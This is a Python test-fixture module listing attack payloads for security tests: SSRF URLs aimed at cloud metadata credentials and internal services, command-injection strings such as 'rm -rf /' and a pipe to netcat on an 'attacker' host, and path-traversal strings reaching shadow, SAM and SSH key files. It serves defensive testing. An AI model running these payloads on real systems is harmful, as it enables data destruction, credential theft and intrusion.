"""Adversarial payloads reused across the security tests."""

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://[fd00:ec2::254]/latest/meta-data/",
    "http://127.0.0.1:8080/admin",
    "http://localhost/internal",
    "http://0.0.0.0/",
    "http://10.0.0.1/",
    "http://192.168.0.1/",
    "http://172.16.0.1/",
    "http://[::1]/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:11211/stats",
]

COMMAND_INJECTION_PAYLOADS = [
    "1+1; import os",
    "__import__('os').system('id')",
    "1; rm -rf /",
    "$(whoami)",
    "`id`",
    "1 && cat /etc/passwd",
    "1 | nc attacker 4444",
    "eval('1')",
    "exec('x=1')",
    "().__class__.__bases__",
    "open('/etc/passwd').read()",
    "1 ; ls",
    "2**999999999",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../../../../etc/shadow",
    "..\\..\\windows\\system32\\config\\sam",
    "/etc/passwd",
    "/root/.ssh/id_rsa",
    "....//....//etc/passwd",
    "docs/../../secret",
    "\x00/etc/passwd",
    "a/../../b",
]

OVERSIZED_INPUTS = {
    "expression": "1+" * 5000 + "1",
    "url": "http://example.com/" + "a" * 5000,
    "path": "a/" * 5000 + "file.txt",
}
